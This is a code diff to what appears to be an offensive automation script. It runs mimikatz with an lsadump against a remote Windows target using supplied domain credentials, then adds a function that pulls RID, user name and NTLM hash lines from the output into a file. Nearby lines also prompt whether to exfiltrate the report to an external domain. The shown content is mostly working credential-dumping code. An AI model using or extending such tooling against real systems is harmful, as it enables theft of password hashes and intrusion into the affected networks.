@@ -40,6 +40,20 @@ def get_domain_name(filepath):
         print(f"An error occurred: {e}")
     return domain_name
 
+# Read mimikatz output and find where there are RID and User lines, if there are both then there is a chance the following
+# Line will be an NTLM Hash.
+
+def get_NTML_hash(filepath):
+    try:
+        with open(filepath, 'r') as f, open('output.txt', 'w') as of:
+            for line in f:
+                if line.strip().startswith('RID  :') or line.strip().startswith('User :'):
+                    of.write(line.strip() + "\n")
+                elif '  Hash NTLM:' in line:
+                    of.write(line.strip() + '\n\n')
+    except Exception as e:
+        print(f"An error occurred extracting the NTLM info: {e}")
+
 # Find out if the report should be exfiltrated
 exfilBool = input("Would you like the generated report to be exfiltrated to an external domain? (y/n)\n")
 
@@ -83,12 +97,14 @@ except KeyError as e:
 dumpNTLMCommand = f"py {dumpNTMLInfo_path} {targetIP} >> c:\\temp\\NTLMInfo.txt"
 os.system(dumpNTLMCommand)
 
-domain_name = get_domain_name(dumpNTMLInfo_path)
+domain_name = get_domain_name("c:\\temp\\NTLMInfo.txt")
 
 # Run the mimikatz script, this uses command.txt which elevates the token and does a lsadump.
 mimiCommand = f"py {mimikatz_path} -f ./command.txt "\
               f"{domain}/{username}:{password}@{targetIP} >> c:\\temp\\mimiOutput.txt"
 os.system(mimiCommand)
+
+get_NTML_hash("c:\\temp\\mimiOutput.txt")
 
 # Run services.py script.
 servicesCommand = f"py {services_path} {domain}/{username}:{password}@{targetIP} list >> c:\\temp\\servicesOutput.txt"
